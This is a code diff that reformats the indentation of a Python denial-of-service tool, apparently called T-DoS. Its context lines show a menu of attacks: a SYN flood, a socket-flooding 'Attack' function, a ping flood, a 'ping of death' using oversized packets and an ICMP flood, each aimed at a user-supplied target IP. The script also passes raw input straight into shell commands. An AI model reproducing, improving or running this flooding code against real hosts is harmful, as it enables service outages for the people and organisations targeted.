@@ -17,7 +17,7 @@ def Attack(target, port):
 
         global attack_num
         attack_num += 1
-	print(attack_num)
+        print(attack_num)
 
         s.close()
         for i in range(500):
@@ -59,10 +59,10 @@ def SYN_Flood(dstIP,dstPort,counter):
 
 	stdout.write("\nTotal packets sent: %i\n" % total)
 def Ping_sl():
-	ip = raw_input("Target IP: ")
-	ping_number = input("Number of pings: ")
-        for a in range(ping_number):
-		os.system("ping " + ip)
+    ip = str(input("Target IP: "))
+    ping_number = input("Number of pings: ")
+    for a in range(ping_number):
+        os.system("ping " + ip)
 def Pingofdeath():
     victimIP = str(input("Target IP: "))
     pingCommand = "ping " + victimIP + " -l 65500 -w 1 -n 1"
@@ -101,11 +101,11 @@ def main():
     print(option)
     if option == 1:
         os.system("clear")
-	print("Disclaimer: On Termux this attack doesn't work (unless you are Root)")
-	print("because of sockets permissions.")   
-	time.sleep(5)
-	os.system("clear")
-	print("  ______    ____       _____")
+        print("Disclaimer: On Termux this attack doesn't work (unless you are Root)")
+        print("because of sockets permissions.")   
+        time.sleep(5)
+        os.system("clear")
+        print("  ______    ____       _____")
         print(" /_  __/   / __ \____ / ___/")
         print("  / /_____/ / / / __ \\__ \ ")
         print(" / /_____/ /_/ / /_/ /__/ / ")
@@ -116,7 +116,7 @@ def main():
         SYN_Flood(dstIP,dstPort,int(counter))
     elif option == 2:
         os.system("clear")
-	print("  ______    ____       _____")
+        print("  ______    ____       _____")
         print(" /_  __/   / __ \____ / ___/")
         print("  / /_____/ / / / __ \\__ \ ")
         print(" / /_____/ /_/ / /_/ /__/ / ")
@@ -125,43 +125,43 @@ def main():
         port = int(input("Target Port (80 suggested): "))
         Attack(target, port)
     elif option == 3:
-	os.system("clear")
-	print("  ______    ____       _____")
+        os.system("clear")
+        print("  ______    ____       _____")
         print(" /_  __/   / __ \____ / ___/")
         print("  / /_____/ / / / __ \\__ \ ")
         print(" / /_____/ /_/ / /_/ /__/ / ")
         print("/_/     /_____/\____/____/  ")
         Ping_sl()
     elif option == 4:
-	os.system("clear")
-	print("  ______    ____       _____")
+        os.system("clear")
+        print("  ______    ____       _____")
         print(" /_  __/   / __ \____ / ___/")
         print("  / /_____/ / / / __ \\__ \ ")
         print(" / /_____/ /_/ / /_/ /__/ / ")
         print("/_/     /_____/\____/____/  ")
-	ip_addr = str(input("Target IP: ")) 
-	stream = os.popen('ping -c 5000 {}'.format(ip_addr))
-	output = stream.read() 
-	if '0 received' in output:
-		print('IP unreachable')
-	else:
-		print('IP reachable')
-		print(output)
+        ip_addr = str(input("Target IP: ")) 
+        stream = os.popen('ping -c 5000 {}'.format(ip_addr))
+        output = stream.read() 
+        if '0 received' in output:
+            print('IP unreachable')
+        else:
+            print('IP reachable')
+            print(output)
     elif option == 5:
-	os.system("clear")
-	print("  ______    ____       _____")
+        os.system("clear")
+        print("  ______    ____       _____")
         print(" /_  __/   / __ \____ / ___/")
         print("  / /_____/ / / / __ \\__ \ ")
         print(" / /_____/ /_/ / /_/ /__/ / ")
         print("/_/     /_____/\____/____/  ")
-	Pingofdeath()
+        Pingofdeath()
     elif option == 6:
-	os.system("clear")
-	print("  ______    ____       _____")
+        os.system("clear")
+        print("  ______    ____       _____")
         print(" /_  __/   / __ \____ / ___/")
         print("  / /_____/ / / / __ \\__ \ ")
         print(" / /_____/ /_/ / /_/ /__/ / ")
         print("/_/     /_____/\____/____/  ")
-	Icmpflood()
+        Icmpflood()
 if __name__ == "__main__":
     main()
